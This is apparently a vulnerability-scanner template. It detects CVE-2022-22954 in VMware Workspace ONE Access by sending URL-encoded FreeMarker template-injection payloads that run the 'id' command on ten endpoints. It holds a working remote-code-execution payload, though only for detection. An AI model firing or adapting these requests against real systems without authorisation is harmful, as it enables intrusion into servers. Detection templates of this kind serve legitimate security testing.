name: yaml-poc-vmware-workspace_one_access-rce-CVE-2022-22954
binding: c0b2304c-4975-4324-bbc8-05e22d7912f0
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/166935/VMware-Workspace-ONE-Access-Template-Injection-Command-Execution.html
        - https://cxsecurity.com/cveshow/CVE-2022-22954/
        - https://cxsecurity.com/issue/WLB-2022050016
        - https://packetstormsecurity.com/files/166935/VMware-Workspace-ONE-Access-Template-Injection-Command-Execution.html
        - https://www.cybersecurity-help.cz/vdb/SB2022040616
        - https://www.rapid7.com/blog/post/2022/04/29/widespread-exploitation-of-vmware-workspace-one-access-cve-2022-22954/
        - https://www.vmware.com/security/advisories/VMSA-2022-0011.html
    vulnerability:
        id: c32c0b71-6e65-4b23-9b45-cdddc8728fc0
        level: critical
    warning: Harmless
transport: http
rules:
    check0:
        request:
            cache: true
            method: GET
            path: /SAAS/auth/login
        expression: response.status == 200 && response.body_string.contains("Workspace ONE Access")
    s0:
        request:
            cache: true
            method: GET
            path: /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d
            headers:
                Host: localhost
        expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error"))
    s1:
        request:
            cache: true
            method: GET
            path: /catalog-portal/ui?code=&deviceType=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d
            headers:
                Host: localhost
        expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error"))
    s2:
        request:
            cache: true
            method: GET
            path: /catalog-portal/ui?code=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d
            headers:
                Host: localhost
        expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error"))
    s3:
        request:
            cache: true
            method: GET
            path: /catalog-portal/hub-ui?deviceType=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d
            headers:
                Host: localhost
        expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error"))
    s4:
        request:
            cache: true
            method: GET
            path: /catalog-portal/hub-ui?deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d
            headers:
                Host: localhost
        expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error"))
    s5:
        request:
            cache: true
            method: GET
            path: /catalog-portal/hub-ui/byob?deviceType=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d
            headers:
                Host: localhost
        expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error"))
    s6:
        request:
            cache: true
            method: GET
            path: /catalog-portal/hub-ui/byob?deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d
            headers:
                Host: localhost
        expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error"))
    s7:
        request:
            cache: true
            method: GET
            path: /catalog-portal/ui/oauth/verify?error=&deviceType=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d
            headers:
                Host: localhost
        expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error"))
    s8:
        request:
            cache: true
            method: GET
            path: /catalog-portal/ui/oauth/verify?code=&deviceType=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d
            headers:
                Host: localhost
        expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error"))
    s9:
        request:
            cache: true
            method: GET
            path: /catalog-portal/ui/oauth/verify?code=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d
            headers:
                Host: localhost
        expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error"))
expression: check0() && (s0() || s1() || s2() || s3() || s4() || s5() || s6() || s7() || s8() || s9())
